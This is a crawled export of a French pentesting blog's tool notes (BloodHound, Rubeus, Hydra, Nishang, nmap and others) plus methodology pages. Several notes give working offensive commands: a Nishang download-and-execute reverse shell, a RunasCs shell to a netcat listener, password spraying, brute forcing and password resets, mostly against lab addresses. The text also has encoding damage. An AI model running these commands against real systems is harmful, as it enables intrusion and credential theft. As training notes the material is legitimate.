[{"content":"La reconnaissance est une Ã©tape clÃ© dans toute campagne de Red Team ou dâ€™audit de sÃ©curitÃ© Active Directory. BloodHound est un outil puissant permettant de visualiser et dâ€™analyser les relations dâ€™un domaine Active Directory en utilisant la thÃ©orie des graphes.\nBloodHound : PrÃ©sentation BloodHound est une application qui cartographie les relations entre les objets Active Directory (utilisateurs, groupes, ordinateurs, sessions, dÃ©lÃ©gations, ACL, etc.) pour identifier des chemins dâ€™attaque possibles, tels que les escalades de privilÃ¨ges ou les mouvements latÃ©raux.\nIl repose sur une base de donnÃ©es orientÃ©e graphe, Neo4j, et une interface graphique puissante qui permet d\u0026rsquo;exÃ©cuter des requÃªtes en langage Cypher pour analyser les chemins d\u0026rsquo;attaque.\nCollecte de donnÃ©es avec bloodhound-python Lâ€™outil classique SharpHound peut Ãªtre remplacÃ© par bloodhound-python, une alternative sans agent Ã©crite en Python. Cela permet une collecte depuis une machine Linux ou directement via un shell Python dans certains cas de compromission.\nExemple de commande complÃ¨te : sudo bloodhound-python -d \u0026lt;domain\u0026gt; -u \u0026lt;username\u0026gt;@\u0026lt;domain\u0026gt; -p \u0026lt;password\u0026gt; -c all -ns \u0026lt;domain_controller_ip\u0026gt; -v Une fois la collecte terminÃ©e, vous obtiendrez un ou plusieurs fichiers .json.gz Ã  importer dans lâ€™interface BloodHound.\nneo4j console http://localhost:7474/ Bloodhound\nhttps://bloodhound.readthedocs.io/en/latest/index.html https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/\n","permalink":"https://nyobemichel.me/posts/outils/bloodhound/","summary":"Bloodhound","title":"Bloodhound"},{"content":"est un couteau suisse d\u0026rsquo;escalade des privilÃ¨ges Active Directory ./bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.42\u0026rdquo; -d \u0026ldquo;Administrator.htb\u0026rdquo; -u \u0026ldquo;olivia\u0026rdquo; -p \u0026ldquo;ichliebedich\u0026rdquo; set password \u0026ldquo;michael\u0026rdquo; \u0026ldquo;Password@123\u0026rdquo; https://github.com/CravateRouge/bloodyAD\n","permalink":"https://nyobemichel.me/posts/outils/bloodyad/","summary":"BloodyAD","title":"BloodyAD"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/chisel/","summary":"chisel","title":"chisel"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crackmapexec/","summary":"Crackmapexec","title":"Crackmapexec"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/curl/","summary":"Curl","title":"curl"},{"content":"Ce shell est le shell WinRM ultime pour le piratage/pentesting.\nWinRM (Windows Remote Management) est l\u0026rsquo;implÃ©mentation Microsoft du protocole WS-Management. Un protocole standard basÃ© sur SOAP qui permet l\u0026rsquo;interopÃ©rabilitÃ© du matÃ©riel et des systÃ¨mes d\u0026rsquo;exploitation de diffÃ©rents fournisseurs. Microsoft l\u0026rsquo;a inclus dans ses systÃ¨mes d\u0026rsquo;exploitation afin de faciliter la vie des administrateurs systÃ¨me.\nCe programme peut Ãªtre utilisÃ© sur n\u0026rsquo;importe quel serveur Microsoft Windows avec cette fonctionnalitÃ© activÃ©e (gÃ©nÃ©ralement sur le port 5985), bien sÃ»r uniquement si vous disposez des informations d\u0026rsquo;identification et des autorisations pour l\u0026rsquo;utiliser. Nous pouvons donc dire qu\u0026rsquo;il pourrait Ãªtre utilisÃ© dans une phase de piratage/pentesting post-exploitation. Le but de ce programme est de fournir des fonctionnalitÃ©s agrÃ©ables et faciles Ã  utiliser pour le piratage. Il peut Ã©galement Ãªtre utilisÃ© Ã  des fins lÃ©gitimes par les administrateurs systÃ¨me, mais la plupart de ses fonctionnalitÃ©s sont axÃ©es sur le piratage/pentesting.\nIl est principalement basÃ© sur la bibliothÃ¨que WinRM Ruby qui a changÃ© sa faÃ§on de fonctionner depuis sa version 2.0. DÃ©sormais, au lieu d\u0026rsquo;utiliser le protocole WinRM, il utilise PSRP (Powershell Remoting Protocol) pour initialiser les pools d\u0026rsquo;espaces d\u0026rsquo;exÃ©cution ainsi que pour crÃ©er et traiter les pipelines.\nevil-winrm -i MonIP -u emily.oscars -p 'Passw'\nhttps://github.com/Hackplayers/evil-winrm\n","permalink":"https://nyobemichel.me/posts/outils/evil-winrm/","summary":"Evil-WinRM","title":"Evil-WinRM"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/ffuf/","summary":"ffuf","title":"ffuf"},{"content":"Peut Ãªtre utilisÃ© pour rÃ©cupÃ©rer les utilisateurs du domaine qui ont dÃ©fini Â« Ne pas exiger de prÃ©-authentification Kerberos Â» et demander leurs TGT sans connaÃ®tre leurs mots de passe. Il est alors possible de tenter de dÃ©chiffrer la clÃ© de session envoyÃ©e avec le ticket pour rÃ©cupÃ©rer le mot de passe de l\u0026rsquo;utilisateur.\nour vÃ©rifier si l\u0026rsquo;un de ces noms d\u0026rsquo;utilisateur est valide, nous utiliserons le script GetNPUsers.py.\n./GetNPUsers.py Domain_name/ -usersfile Usernames.txt -dc-ip 10.129.28.119 https://tools.thehacker.recipes/impacket/examples/getnpusers.py#commons\n","permalink":"https://nyobemichel.me/posts/outils/getnpusers.py/","summary":"GetNPUsers.py","title":"GetNPUsers.py"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/gobuster/","summary":"Gobuster","title":"Gobuster"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/guacamole/","summary":"Guacamole","title":"Guacamole"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/hascat/","summary":"hascat","title":"hascat"},{"content":"hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v Pages de connexionÂ HTTP\nhydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form \u0026#34;/login-get/index.php:username=^USER^\u0026amp;password=^PASS^:S=logout.php\u0026#34; -f SMTP\nhydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v https://github.com/digininja/CeWL ( generer une liste de mot passe )\n","permalink":"https://nyobemichel.me/posts/outils/hydra/","summary":"Hydra","title":"Hydra"},{"content":"Kerbrute est un outil d\u0026rsquo;Ã©numÃ©ration populaire utilisÃ© pour forcer et Ã©numÃ©rer les utilisateurs Active Directory valides en abusant de laÂ prÃ©-authentificationÂ Kerberos . https://github.com/ropnop/kerbrute/releases Rendre Kerbrute executable Enumeration des utilisateurs L\u0026rsquo;Ã©numÃ©ration des utilisateurs vous permet de savoir quels comptes d\u0026rsquo;utilisateurs se trouvent sur le domaine cible et quels comptes pourraient potentiellement Ãªtre utilisÃ©s pour accÃ©der au rÃ©seau.\n./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt ","permalink":"https://nyobemichel.me/posts/outils/kerbrute/","summary":"kerbrute","title":"kerbrute"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/linpeas/","summary":"linPeas","title":"linPeas"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/netexec/","summary":"NetExec","title":"NetExec"},{"content":"Nishang est un framework et un ensemble de scripts et de charges utiles permettant d\u0026rsquo;utiliser PowerShell pour la sÃ©curitÃ© offensive, les tests d\u0026rsquo;intrusion et le red teaming. Nishang est utile Ã  toutes les phases des tests d\u0026rsquo;intrusion.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;yourwebserver\u0026gt;/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] https://github.com/samratashok/nishang\n","permalink":"https://nyobemichel.me/posts/outils/nishang/","summary":"Nishang","title":"Nishang"},{"content":"nmap -sV -sC $IP -v -p- --min-rate 1000 -Pn -T4\nII existe au total 6 Ã©tats diffÃ©rents pour un port scannÃ© que nous pouvons obtenirÂ : Open Closed Filtered unfiltered open | filtered Closed | filtered -Pn DÃ©sactive les requÃªtes ICMP Echo. \u0026lsquo; nmap 10.129.2.0/24 -F | grep \u0026quot;/tcp\u0026quot; | wc -l\u0026rsquo;\nLeurres Il existe des cas dans lesquels les administrateurs bloquent en principe des sous-rÃ©seaux spÃ©cifiques de diffÃ©rentes rÃ©gions. Cela empÃªche tout accÃ¨s au rÃ©seau cible. Un autre exemple est lorsque IPS doit nous bloquer. Pour cette raison, la mÃ©thode de balayage Decoy (Â -D) est le bon choix. Avec cette mÃ©thode, Nmap gÃ©nÃ¨re diverses adresses IP alÃ©atoires insÃ©rÃ©es dans l\u0026rsquo;en-tÃªte IP pour masquer l\u0026rsquo;origine du paquet envoyÃ©. Avec cette mÃ©thode, nous pouvons gÃ©nÃ©rer alÃ©atoirement (Â RND) un nombre spÃ©cifique (par exemple :Â 5) d\u0026rsquo;adresses IP sÃ©parÃ©es par deux points (Â :). Notre vÃ©ritable adresse IP est ensuite placÃ©e alÃ©atoirement entre les adresses IP gÃ©nÃ©rÃ©es. Dans l\u0026rsquo;exemple suivant, notre vÃ©ritable adresse IP est donc placÃ©e en deuxiÃ¨me position. Un autre point critique est que les leurres doivent Ãªtre vivants. Sinon, le service sur la cible peut Ãªtre inaccessible en raison des mÃ©canismes de sÃ©curitÃ© SYN-flooding.\nnmap $ip -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 -p 80 Analyse uniquement les ports spÃ©cifiÃ©s. -sS ExÃ©cute une analyse SYN sur les ports spÃ©cifiÃ©s. -Pn DÃ©sactive les requÃªtes ICMP Echo. -n DÃ©sactive la rÃ©solution DNS. --disable-arp-ping DÃ©sactive le ping ARP. --packet-trace Affiche tous les paquets envoyÃ©s et reÃ§us. -D RND:5 GÃ©nÃ¨re cinq adresses IP alÃ©atoires qui indiquent l\u0026rsquo;IP source d\u0026rsquo;oÃ¹ provient la connexion. `nmap 10.129.96.164 -n -Pn -p 80 -O -S 10.10.15.130 -e tun0 -sV` Proxy DNS Par dÃ©faut,Â Nmapeffectue une rÃ©solution DNS inverse, sauf indication contraire, pour trouver des informations plus importantes sur notre cible. Ces requÃªtes DNS sont Ã©galement transmises dans la plupart des cas, car le serveur Web donnÃ© est censÃ© Ãªtre trouvÃ© et visitÃ©. Les requÃªtes DNS sont effectuÃ©es via leÂ UDP port 53. LeÂ TCP port 53Ã©tait auparavant utilisÃ© uniquement pour les \u0026quot;Â Zone transfers\u0026quot; entre les serveurs DNS ou le transfert de donnÃ©es supÃ©rieur Ã  512 octets. De plus en plus, cela change en raison des extensions IPv6 et DNSSEC. Ces changements entraÃ®nent de nombreuses requÃªtes DNS via le port TCP 53.\nCependant, celaÂ Nmapnous donne toujours un moyen de spÃ©cifier nous-mÃªmes les serveurs DNS (Â --dns-server \u0026lt;ns\u0026gt;,\u0026lt;ns\u0026gt;). Cette mÃ©thode pourrait nous Ãªtre fondamentale si nous nous trouvons dans une zone dÃ©militarisÃ©e (Â DMZ). Les serveurs DNS de l\u0026rsquo;entreprise sont gÃ©nÃ©ralement plus fiables que ceux d\u0026rsquo;Internet. Ainsi, par exemple, nous pourrions les utiliser pour interagir avec les hÃ´tes du rÃ©seau interne. Comme autre exemple, nous pouvons utiliserÂ TCP port 53comme port source (Â --source-port) pour nos analyses. Si l\u0026rsquo;administrateur utilise le pare-feu pour contrÃ´ler ce port et ne filtre pas correctement les IDS/IPS, nos paquets TCP seront approuvÃ©s et transmis.\nnmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 ncat -nv --source-port 53 10.129.150.182 50000 ","permalink":"https://nyobemichel.me/posts/outils/nmap/","summary":"Nmap","title":"Nmap"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/powerups/","summary":"PowerUps","title":"PowerUps"},{"content":"Get-DomainGPOLocalGroup Renvoie tous les objets de stratÃ©gie de groupe d\u0026rsquo;un domaine qui modifient les appartenances aux groupes locaux via les prÃ©fÃ©rences Â«Â Groupes restreintsÂ Â» ou StratÃ©gie de groupe. Renvoie Ã©galement leurs mappages d\u0026rsquo;appartenance d\u0026rsquo;utilisateur, s\u0026rsquo;ils existent.\nGet-DomainObjectAcl Renvoie les ACL associÃ©es Ã  un objet Active Directory spÃ©cifique. debut de l\u0026rsquo;attaque [[Abusing Active Directory ACLs]]\nGet-DomainObjectAcl -Identity \u0026#34;Domain Admins\u0026#34; -ResolveGUIDs - Verbose PowerView\nLe Domaine Courant Get-Netdomain Obtenir le SID du domain actuel Get-DomainSID Obtenir les COntrolleur de domaine Get-NetDomainController Obtenir la liste des utilisateurs du Domaine Get-NetUser Recherche les machines sur le domaine local oÃ¹ l\u0026rsquo;utilisateur actuel dispose d\u0026rsquo;un accÃ¨s administrateur local. Find-LocalAdminAccess ","permalink":"https://nyobemichel.me/posts/outils/poweview/","summary":"Poweview","title":"Poweview"},{"content":"Il achemine tout le trafic provenant de n\u0026rsquo;importe quel outil de ligne de commande vers n\u0026rsquo;importe quel proxy que nous spÃ©cifions. il ajoute un proxy Ã  n\u0026rsquo;importe quel outil de ligne de commande et constitue donc la mÃ©thode la plus simple pour acheminer le trafic Web des outils de ligne de commande via nos proxys Web. Pour utiliserÂ proxychains, nous devons d\u0026rsquo;abord Ã©diterÂ /etc/proxychains.conf, commenter la derniÃ¨re ligne et ajouter la ligne suivante Ã  la fin de celle-ci :\n#socks4 127.0.0.1 9050 http 127.0.0.1 8080 Nous devrions Ã©galement activerÂ Quiet Mode pour la rÃ©duction du bruit en dÃ©commettantÂ quiet_mode. Une fois cela fait, nous pouvons ajouterÂ proxychains a n\u0026rsquo;importe quelle commande au dÃ©but, et le trafic de cette commande sera acheminÃ© viaÂ proxychains pour notre proxy web. Par exemple, essayons d\u0026rsquo;utiliserÂ cURLl\u0026rsquo;un de nos exercices prÃ©cÃ©dentsÂ :\nproxychains curl http://SERVER_IP:PORT ProxyChains-3.1 (http://proxychains.sf.net) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Ping IP\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; ...SNIP... \u0026lt;/html\u0026gt; https://github.com/haad/proxychains\n","permalink":"https://nyobemichel.me/posts/outils/proxychains/","summary":"proxychains","title":"Proxychains"},{"content":"https://learn.microsoft.com/en-us/sysinternals/downloads/psexec psexec.py /:@[[username-anarchyPublic]]\n","permalink":"https://nyobemichel.me/posts/outils/psexec-v2.43/","summary":"PsExec v2.43","title":"PsExec v2.43"},{"content":"LLMNR/NBT-NS/mDNS Poisoner\n","permalink":"https://nyobemichel.me/posts/outils/responder/","summary":"Responder","title":"Responder"},{"content":"Rubeus est un outil puissant pour attaquer Kerberos. AdaptÃ© de l\u0026rsquo;outil Kekeo, Rubeus propose une grande variÃ©tÃ© d\u0026rsquo;attaques et de fonctionnalitÃ©s qui en font un outil trÃ¨s polyvalent pour attaquer Kerberos. Parmi ses nombreux outils et attaques, on peut citer le dÃ©passement de hachage, les demandes et renouvellements de tickets, la gestion et l\u0026rsquo;extraction de tickets, la collecte, la transmission de tickets, l\u0026rsquo;AS-REP Roasting et le Kerberoasting. https://github.com/GhostPack/Rubeus\nRÃ©colte de Tickets Rubeus.exe harvest /interval:30 Cette commande indique a Rubeux de recolter des TGT toutes les 30 secondes\nForce Brute / Pulverisation de mot de passe Cette attaque utilise un mot de passe Kerberos donnÃ©, le diffuse sur tous les utilisateurs dÃ©tectÃ©s et gÃ©nÃ¨re un ticket .kirbi. Ce ticket est un TGT permettant d\u0026rsquo;obtenir des tickets de service auprÃ¨s du KDC, ainsi que dans des attaques telles que l\u0026rsquo;attaque par transfert de ticket.\nRubeus.exe brute /password:Password1 /noticket Cela prendra un mot de passe donnÃ© et le Â« vaporisera Â» sur tous les utilisateurs trouvÃ©s, puis donnera leÂ TGTÂ .kirbi pour cet utilisateur\n","permalink":"https://nyobemichel.me/posts/outils/rubeus/","summary":"Rubeus","title":"Rubeus"},{"content":"./RunasCs.exe \u0026lsquo;M.schoolbus\u0026rsquo; \u0026lsquo;\u0026rsquo; powershell.exe -r \u0026lt;nc_IP\u0026gt;:\u0026lt;nc_Port\u0026gt;\n","permalink":"https://nyobemichel.me/posts/outils/runascs/","summary":"Runascs","title":"Runascs"},{"content":"Utiliser le fichier avec sqlmap :\nsqlmap -r requete.txt --dump --batch ","permalink":"https://nyobemichel.me/posts/outils/sqlmap/","summary":"SQLMAp","title":"SQLMAp"},{"content":"sshuttleÂ : lÃ  oÃ¹ le proxy transparent rencontre le VPN et SSH Autant que je sache, sshuttle est le seul programme qui rÃ©sout le cas courant suivantÂ :\nVotre machine cliente (ou routeur) est Linux, FreeBSD, MacOS ou Windows. Vous avez accÃ¨s Ã  un rÃ©seau distant via ssh. Vous nâ€™avez pas nÃ©cessairement accÃ¨s administrateur sur le rÃ©seau distant. Le rÃ©seau distant n\u0026rsquo;a pas de VPN, ou seulement des protocoles VPN complexes (IPsec, PPTP, etc.). Ou peut-ÃªtreÂ Ãªtes-Â vous l\u0026rsquo;administrateur et Ãªtes-vous simplement frustrÃ© par l\u0026rsquo;Ã©tat lamentable des outils VPNÂ ? Vous ne souhaitez pas crÃ©er une redirection de port SSH pour chaque hÃ´te/port du rÃ©seau distant. Vous dÃ©testez la redirection de port d\u0026rsquo;OpenSH parce qu\u0026rsquo;elle est alÃ©atoirement lente et/ou stupide. Vous ne pouvez pas utiliser la fonctionnalitÃ© PermitTunnel d\u0026rsquo;OpenSH car elle est dÃ©sactivÃ©e par dÃ©faut sur les serveurs OpenSHÂ ; de plus, elle utilise TCP-over-TCP, ce qui aÂ des performances terriblesÂ . ","permalink":"https://nyobemichel.me/posts/outils/sshuttle/","summary":"sshuttle","title":"sshuttle"},{"content":"Outils permettant de gÃ©nÃ©rer des noms d\u0026rsquo;utilisateur lors de tests de pÃ©nÃ©tration.Â _Les noms d\u0026rsquo;utilisateur reprÃ©sentent la moitiÃ© du problÃ¨me de force brute des mots de passe.\n./username-anarchy --input-file Names.txt --select-format first.last,firstl,f.last,flast \u0026gt; Usernames.txt https://github.com/urbanadventurer/username-anarchy\n","permalink":"https://nyobemichel.me/posts/outils/username-anarchypublic/","summary":"username-anarchyPublic","title":"username-anarchyPublic"},{"content":" The version of WordPress installed and any associated vulnerabilities What plugins are installed and any associated vulnerabilities What themes are installed and any associated vulnerabilities Username enumeration Users with weak passwords via password brute forcing Backed up and publicly accessible wp-config.php files Database dumps that may be publicly accessible If error logs are exposed by plugins Media file enumeration Vulnerable Timthumb files If the WordPress readme file is present If WP-Cron is enabled If user registration is enabled Full Path Disclose Upload directory listing https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation ","permalink":"https://nyobemichel.me/posts/outils/wpscan/","summary":"WPscan","title":"WPscan"},{"content":"Port 21\nQuelques Commande FTP get , Connect , put , quit , status , verbose ft $IP Telecharger tous les fichiers disponibles\nwget -m --no-passive ftp://anonymous:anonymous@10.129.14.13 Trouver tous les scripts ftp Nmap\nfind / -type f -name ftp* 2\u0026gt;/dev/null | grep scripts ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---ftp/","summary":"FTP","title":"Enumeration - FTP"},{"content":"Network File System(Â NFS) est un systÃ¨me de fichiers rÃ©seau dÃ©veloppÃ© par Sun Microsystems et dont l\u0026rsquo;objectif est le mÃªme que SMB.\nsudo nmap --script nfs* $ip$ -sV -p111,2049 Afficher les partage NFS Disponible\nshowmount -e 10.129.14.128 Montage du partage NFS\nmkdir target-NFS sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock cd target-NFS tree . ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---nfs/","summary":"NFS","title":"Enumeration - NFS"},{"content":"Definition Server Message Block ( SMB ) est un protocole de communication utilisÃ© pour partager des fichiers, des imprimantes , des ports sÃ©rie et diverses communications entre les nÅ“uds d\u0026rsquo;un rÃ©seau\nport SMB 139 445\ntools smbclient\nL : list des partages sur la machines -U : user smbmap H : user crackmapexec smb 192.168.1.17 -u \u0026lsquo;raj\u0026rsquo; -p \u0026lsquo;123\u0026rsquo; \u0026ndash;shares \u0026ndash;users\nsudo nmap $ip$ -sV -sC -p139,445 rpcclient -U \u0026#34; \u0026#34; $ip LeÂ rpcclientclient rpc propose de nombreuses requÃªtes permettant d\u0026rsquo;exÃ©cuter des fonctions spÃ©cifiques sur le serveur SMB pour obtenir des informations srvinfo , enumdomains, querydominfo, netshareenumall , netsharegetinfo , enumdomusers , queryuser Impacket - Samrrdump.py\nsmbmap -H $ip https://fr.wikipedia.org/wiki/Server_Message_Block\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smb/","summary":"SMB","title":"Enumeration - SMB"},{"content":"Le protocoleÂ Simple Mail Transfer Protocol(Â SMTP) permet d\u0026rsquo;envoyer des e-mails sur un rÃ©seau IP. Il peut Ãªtre utilisÃ© entre un client de messagerie et un serveur de courrier sortant, ou entre deux serveurs SMTP Par dÃ©faut, les serveurs SMTP acceptent les demandes de connexion sur le portÂ 25 Pour interagir avec le serveur SMTP, nous pouvons utiliser l\u0026rsquo;Â telnetoutil pour initialiser une connexion TCP. L\u0026rsquo;initialisation de la session s\u0026rsquo;effectue avec la commande mentionnÃ©e ci-dessus,Â HELOouÂ EHLO.\\\ntelnet IP_ADRESS 25 sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v smtp-user-enum smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.1.62 ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smtp/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"1. Phase de prÃ©-engagement La phase de prÃ©-engagement est cruciale car elle pose les bases de l\u0026rsquo;ensemble du test de pÃ©nÃ©tration. Au cours de cette phase, les testeurs de pÃ©nÃ©tration travaillent en Ã©troite collaboration avec le client pour comprendre ses besoins, ses prÃ©occupations et ses objectifs spÃ©cifiques. Cela comprend la dÃ©finition de la portÃ©e du test, l\u0026rsquo;Ã©tablissement des Ã©chÃ©anciers et la dÃ©termination des systÃ¨mes et des rÃ©seaux qui seront testÃ©s.\n2. Phase de collecte d\u0026rsquo;informations La collecte d\u0026rsquo;informations, Ã©galement appelÃ©e reconnaissance ou collecte de renseignements, consiste Ã  recueillir autant d\u0026rsquo;informations pertinentes que possible sur la cible. Cette phase peut Ãªtre divisÃ©e en reconnaissance passive et active.\nPassive reconnaissanceimplique la collecte d\u0026rsquo;informations sans interaction directe avec les systÃ¨mes cibles. Cela peut inclure l\u0026rsquo;analyse de documents publics, la recherche sur les rÃ©seaux sociaux, l\u0026rsquo;examen des sites Web d\u0026rsquo;entreprises et l\u0026rsquo;utilisation d\u0026rsquo;outils OSINT (Open Source Intelligence). Cette approche ne laisse aucune trace et ne prÃ©sente aucun risque pour l\u0026rsquo;infrastructure cible.\nActive reconnaissance, d\u0026rsquo;autre part, implique une interaction directe avec les systÃ¨mes cibles. Cela inclut des activitÃ©s telles que l\u0026rsquo;analyse des ports, l\u0026rsquo;Ã©numÃ©ration des services et la capture de banniÃ¨res. Bien que plus intrusive, cette mÃ©thode fournit des informations techniques dÃ©taillÃ©es sur l\u0026rsquo;environnement cible.\n3. Phase dâ€™Ã©valuation de la vulnÃ©rabilitÃ© Au cours de la phase d\u0026rsquo;Ã©valuation des vulnÃ©rabilitÃ©s, les testeurs de pÃ©nÃ©trationÂ analyse les informations se sont rÃ©unis pour identifier les faiblesses potentielles en matiÃ¨re de sÃ©curitÃ©. Cela implique l\u0026rsquo;utilisation de divers outils d\u0026rsquo;analyse automatisÃ©s et de techniques de test manuel pour dÃ©couvrir les vulnÃ©rabilitÃ©s des systÃ¨mes, des applications et de l\u0026rsquo;infrastructure rÃ©seau.\n4. Phase d\u0026rsquo;exploitation La phase d\u0026rsquo;exploitation est celle oÃ¹ les testeurs de pÃ©nÃ©tration tentent d\u0026rsquo;exploiterÂ les vulnÃ©rabilitÃ©s identifiÃ©es lors de la phase prÃ©cÃ©dente. Cela permet de dÃ©montrer l\u0026rsquo;impact rÃ©el des faiblesses de sÃ©curitÃ© et d\u0026rsquo;Ã©tablir ce qu\u0026rsquo;un attaquant rÃ©el pourrait Ãªtre en mesure d\u0026rsquo;accomplir.\nLors de l\u0026rsquo;exploitation, les testeurs doivent documenter soigneusement leurs activitÃ©s et conserver un enregistrement prÃ©cis des systÃ¨mes auxquels ils ont accÃ©dÃ©. Il est essentiel de respecter les rÃ¨gles d\u0026rsquo;engagement convenues et d\u0026rsquo;Ã©viter de causer des dommages aux systÃ¨mes de production. Les testeurs qualifiÃ©s crÃ©ent souvent des chaÃ®nes d\u0026rsquo;attaque dÃ©taillÃ©es, montrant comment plusieurs vulnÃ©rabilitÃ©s peuvent Ãªtre combinÃ©es pour obtenir un accÃ¨s plus approfondi.\n5. Phase post-exploitation Une fois l\u0026rsquo;accÃ¨s initial obtenu, la phase de post-exploitation commence. Cette phase comprend des activitÃ©s telles que l\u0026rsquo;escalade des privilÃ¨ges, le mouvement latÃ©ral Ã  travers le rÃ©seau, les tests d\u0026rsquo;exfiltration de donnÃ©es et le maintien de la persistance. L\u0026rsquo;objectif est de comprendre l\u0026rsquo;Ã©tendue complÃ¨te de ce qu\u0026rsquo;un attaquant pourrait accomplir aprÃ¨s avoir franchi les dÃ©fenses initiales.\n6. Phase de mouvement latÃ©ral Le mouvement latÃ©ral consiste Ã  naviguer dans le rÃ©seau aprÃ¨s avoir obtenu un accÃ¨s initial pour dÃ©couvrir des systÃ¨mes, des ressources et des cibles potentielles supplÃ©mentaires. Cette phase se concentre sur l\u0026rsquo;identification et l\u0026rsquo;exploitation des relations de confiance entre les systÃ¨mes et sur l\u0026rsquo;Ã©largissement de la prÃ©sence du testeur de pÃ©nÃ©tration au sein du rÃ©seau.\n7. Preuve de concept La phase de preuve de concept consiste Ã  crÃ©erÂ un document detaille des preuves des preuves dÃ©montrant comment les vulnÃ©rabilitÃ©s ont Ã©tÃ© exploitÃ©es. Cela comprend le dÃ©veloppement de mÃ©thodes fiables et reproductibles pour reproduire les problÃ¨mes de sÃ©curitÃ© identifiÃ©s, ce qui permet de valider les rÃ©sultats et d\u0026rsquo;aider l\u0026rsquo;Ã©quipe technique du client Ã  comprendre et Ã  corriger les vulnÃ©rabilitÃ©s.\n8. Phase post-engagement La phase de reporting est essentielle car elleÂ permet de compiler les rÃ©sultats techniquesÂ actionable information for the client. Un rapport de test de pÃ©nÃ©tration bien rÃ©digÃ© comprend gÃ©nÃ©ralement un rÃ©sumÃ© destinÃ© Ã  la direction, des rÃ©sultats techniques dÃ©taillÃ©s destinÃ©s Ã  l\u0026rsquo;Ã©quipe informatique et des recommandations claires pour la correction.\n9. Assistance Ã  la remÃ©diation et nouveaux tests AprÃ¨s la remise du rapport, de nombreuses missions de tests d\u0026rsquo;intrusion incluent une pÃ©riode de support de correction. Pendant cette pÃ©riode, les testeurs se rendent disponibles pour rÃ©pondre aux questions sur leurs conclusions et fournir des conseils supplÃ©mentaires sur la mise en Å“uvre des correctifs.\n","permalink":"https://nyobemichel.me/posts/structure-test-penetration/","summary":"Un aperÃ§u des phases lors d\u0026rsquo;un test dâ€™intrusion","title":"structure test penetration"},{"content":"Avant de se lancer dans un test de pÃ©nÃ©tration, plusieursÂ crucial prerequisitesÃ©lÃ©ments doivent Ãªtre Ã©tablis pour garantir un engagement rÃ©ussi, lÃ©gal et professionnel. Ces Ã©lÃ©ments fondamentaux protÃ¨gent Ã  la fois le testeur de pÃ©nÃ©tration et le client tout en maximisant la valeur de l\u0026rsquo;Ã©valuation. Ces Ã©lÃ©ments peuvent Ãªtre, sans s\u0026rsquo;y limiter :\nAutorisation lÃ©gale et documentation DÃ©finition et limites du champ d\u0026rsquo;application Collecte d\u0026rsquo;informations Canaux de communication et procÃ©dures d\u0026rsquo;urgence PrÃ©paration de l\u0026rsquo;environnement de test ConsidÃ©rations relatives Ã  la sauvegarde et Ã  la rÃ©cupÃ©ration Documentation et rapports ResponsabilitÃ© professionnelle et assurance ConfidentialitÃ© et traitement des donnÃ©es Autorisation lÃ©gale et documentation La pierre angulaire de toute mission de test de pÃ©nÃ©tration est une autorisation lÃ©gale appropriÃ©e. Cela commence par un accord Ã©crit formel, souvent appelÃ©Â Statement of Work(Â SoW) ouÂ Master Services Agreement(Â MSA). Un MSA est souvent utilisÃ© lorsqu\u0026rsquo;il existe une relation continue entre le client et le prestataire de services de test de pÃ©nÃ©tration. Il dÃ©crit les conditions gÃ©nÃ©rales de la relation commerciale\nMÃ©thodologies de test de pÃ©nÃ©tration de base Penetration Testing Execution Standard La mÃ©thodologie la plus largement reconnue dans le domaine des tests de pÃ©nÃ©tration est laÂ Penetration Testing Execution StandardÂ .Â La PTES fournit un cadre qui divise le processus de test de pÃ©nÃ©tration en sept phases distinctes : interactions avant engagement, collecte de renseignements, modÃ©lisation des menaces, analyse des vulnÃ©rabilitÃ©s, exploitation, post-exploitation et reporting. http://www.pentest-standard.org/index.php/Main_Page\nLeÂ Technical Guide to Information Security Testing and Assessment reprÃ©sente une approche plus formelle. Bien qu'il ne s'agisse pas strictement d'une mÃ©thodologie de test de pÃ©nÃ©tration, il fournit des conseils prÃ©cieux sur la planification, l'exÃ©cution et les activitÃ©s post-test de l'Ã©valuation de la sÃ©curitÃ©. Ce cadre est particuliÃ¨rement pertinent lorsque l'on travaille avec des agences ou des organisations gouvernementales qui suivent les directives du NIST. https://www.nist.gov/privacy-framework/nist-sp-800-115\nOpen Web Application Security Project Lâ€™OWASP WSTG se concentre sur les tests de sÃ©curitÃ© applicative web, avec des cas de test dÃ©taillÃ©s pour chaque vecteur dâ€™attaque connu.\nhttps://owasp.org/www-project-web-security-testing-guide/stable/\nLe cadreÂ 